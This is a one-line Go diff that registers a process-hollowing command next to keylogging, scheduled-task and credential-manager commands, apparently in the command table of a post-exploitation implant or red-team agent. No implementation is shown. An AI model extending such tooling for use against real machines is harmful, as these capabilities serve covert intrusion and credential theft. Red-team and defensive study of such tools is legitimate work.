@@ -51,4 +51,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&KeylogCommand{})
 	RegisterCommand(&SchtaskCommand{})
 	RegisterCommand(&CredmanCommand{})
+	RegisterCommand(&HollowingCommand{})
 }
